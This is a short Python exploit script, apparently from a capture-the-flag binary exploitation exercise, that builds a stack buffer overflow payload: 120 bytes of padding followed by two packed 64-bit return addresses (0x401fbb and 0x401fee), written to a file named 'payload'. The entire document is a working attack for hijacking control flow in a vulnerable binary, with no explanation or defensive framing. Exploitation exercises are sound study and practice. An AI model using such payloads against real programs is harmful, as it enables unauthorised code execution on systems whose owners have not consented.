#!/usr/bin/env python3

from struct import pack


payload = b'a' * 120
payload += pack("<Q", 0x401fbb)
payload += pack("<Q", 0x401fee)

with open("payload", "wb") as f:
    f.write(payload)
